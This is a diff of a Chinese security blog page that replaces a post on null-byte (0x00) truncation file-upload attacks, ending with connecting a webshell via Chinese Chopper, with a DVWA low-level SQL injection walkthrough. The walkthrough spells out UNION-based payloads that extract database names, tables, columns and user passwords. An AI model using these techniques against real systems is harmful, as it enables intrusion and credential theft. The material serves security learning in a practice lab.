@@ -6,22 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://ulcane.com">
-  <title>利用00截断 | ulcane&#39;s blog</title>
+  <title>dvwa之sql注入 | ulcane&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="原理利用程序猿在写程序时对文件上传路径过滤不严格，产生0X00截断上传漏洞">
+  <meta name="description" content="low级别 SQL显错注入">
 <meta name="keywords" content="其他">
 <meta property="og:type" content="article">
-<meta property="og:title" content="利用00截断">
-<meta property="og:url" content="http://ulcane.com/2018/02/04/利用00截断/index.html">
+<meta property="og:title" content="dvwa之sql注入">
+<meta property="og:url" content="http://ulcane.com/2018/02/06/sql注入/index.html">
 <meta property="og:site_name" content="ulcane&#39;s blog">
-<meta property="og:description" content="原理利用程序猿在写程序时对文件上传路径过滤不严格，产生0X00截断上传漏洞">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/0060lm7Tly1foofnypyg2j30ue0klq5b.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/0060lm7Tly1fooft6j3onj30qq0ehmyk.jpg">
-<meta property="og:updated_time" content="2018-02-25T08:11:10.854Z">
+<meta property="og:description" content="low级别 SQL显错注入">
+<meta property="og:updated_time" content="2018-02-25T08:46:55.028Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="利用00截断">
-<meta name="twitter:description" content="原理利用程序猿在写程序时对文件上传路径过滤不严格，产生0X00截断上传漏洞">
-<meta name="twitter:image" content="http://ww4.sinaimg.cn/large/0060lm7Tly1foofnypyg2j30ue0klq5b.jpg">
+<meta name="twitter:title" content="dvwa之sql注入">
+<meta name="twitter:description" content="low级别 SQL显错注入">
   
     <link rel="alternative" href="/atom.xml" title="ulcane&#39;s blog" type="application/atom+xml">
   
@@ -157,33 +154,53 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-利用00截断" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-sql注入" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      利用00截断
+      dvwa之sql注入
     </h1>
   
 
         
-        <a href="/2018/02/04/利用00截断/" class="archive-article-date">
-  	<time datetime="2018-02-04T16:36:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-04</time>
+        <a href="/2018/02/06/sql注入/" class="archive-article-date">
+  	<time datetime="2018-02-06T15:36:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-06</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用程序猿在写程序时对文件上传路径过滤不严格，产生0X00截断上传漏洞<a id="more"></a></p>
-<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>首先假设文件上传路径是<a href="http://xx.xx.xx.xx/xxx/vv.php.jpg,然后通过抓包截断将php.jpg后的.换成0x00，当文件读到这里，会认为文件已经结束，将vv.php.jpg的内容写入php.jpg里" target="_blank" rel="noopener">http://xx.xx.xx.xx/xxx/vv.php.jpg,然后通过抓包截断将php.jpg后的.换成0x00，当文件读到这里，会认为文件已经结束，将vv.php.jpg的内容写入php.jpg里</a></p>
-<h4 id="在这之前"><a href="#在这之前" class="headerlink" title="在这之前"></a>在这之前</h4><p>先要完成一些配置</p>
-<h5 id="火狐浏览器"><a href="#火狐浏览器" class="headerlink" title="火狐浏览器"></a>火狐浏览器</h5><p>选项-&gt;常规-&gt;网络代理<br><img src="http://ww4.sinaimg.cn/large/0060lm7Tly1foofnypyg2j30ue0klq5b.jpg" alt=""></p>
-<h5 id="burpsite"><a href="#burpsite" class="headerlink" title="burpsite"></a>burpsite</h5><p><img src="http://ww1.sinaimg.cn/large/0060lm7Tly1fooft6j3onj30qq0ehmyk.jpg" alt=""></p>
-<p>####<br>修改之后对页面进行抓包，抓包后hex看十六进制，找到.所对应的再改成0x00</p>
-<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>打开菜刀，添加木马地址，完工</p>
+        <h2 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h2><p> SQL显错注入<a id="more"></a></p>
+<h5 id="判断是否存在-sql-注入"><a href="#判断是否存在-sql-注入" class="headerlink" title="判断是否存在 sql 注入"></a>判断是否存在 sql 注入</h5><ul>
+<li>输入<code>&#39;</code> 查询的语句</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &apos;1&apos;&apos;;</span><br></pre></td></tr></table></figure>
+<p>导致单引号数目不平衡，报错</p>
+<ul>
+<li>输入<code>1&#39; and 1=1 +--+</code> 查询的语句</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &apos;1&apos; and 1=1 +--+&apos;;</span><br></pre></td></tr></table></figure>
+<p>不报错，返回正常</p>
+<ul>
+<li>输入<code>1&#39; and 1=2 +--+</code> 查询的语句<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &apos;1&apos; and 1=2 +--+&apos;;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>返回不正常，可以判断有SQL注入</p>
+<hr>
+<h5 id="猜测列数"><a href="#猜测列数" class="headerlink" title="猜测列数"></a>猜测列数</h5><p>分析字段数的原因是我们之后需要用<code>union select</code>语句来获得我们需要的敏感数据。根据<code>order by</code>知识知道，要是后面跟着的数字超出了字段数时，就会报错！通过这个我们可以确定字段数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order by 5</span><br><span class="line">order by 3</span><br><span class="line">order by 2</span><br></pre></td></tr></table></figure>
+<h5 id="爆出显位数字"><a href="#爆出显位数字" class="headerlink" title="爆出显位数字"></a>爆出显位数字</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,2 +--+</span><br></pre></td></tr></table></figure>
+<h5 id="查询一些敏感信息"><a href="#查询一些敏感信息" class="headerlink" title="查询一些敏感信息"></a>查询一些敏感信息</h5><p>我们可以通过修改这些显位数字来获取一些我们需要的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">version()       ---    看数据库的版本</span><br><span class="line">database()	---	查数据库名称</span><br><span class="line">user()		---	查当前数据库用户的权限</span><br><span class="line">@@version_compile_os		---	查看操作系统版本</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.109/vulnerabilities/sqli/?id=1&apos; UNION SELECT 1,database() +--+ &amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
+<h5 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h5><p><code>GROUP_CONCAT</code>函数返回一个字符串结果，该结果由分组中的值连接组合而成。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.109/vulnerabilities/sqli/?id=1&apos; UNION SELECT 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761 +--+ &amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
+<h5 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.109/vulnerabilities/sqli/?id=1&apos; UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 +--+ &amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
+<h5 id="查询字段内容"><a href="#查询字段内容" class="headerlink" title="查询字段内容"></a>查询字段内容</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.109/vulnerabilities/sqli/?id=1&apos; UNION SELECT user,password from users +--+ &amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
+<hr>
 
       
 
@@ -274,7 +291,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://ulcane.com/2018/02/04/利用00截断/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://ulcane.com/2018/02/06/sql注入/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -288,18 +305,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/02/06/sql注入/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/02/11/密码学/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          dvwa之sql注入
+          古典密码
         
       </div>
     </a>
   
   
-    <a href="/2018/02/02/基础知识/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">基础知识</div>
+    <a href="/2018/02/04/利用00截断/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">利用00截断</div>
       <i class="icon-circle-right"></i>
     </a>
   
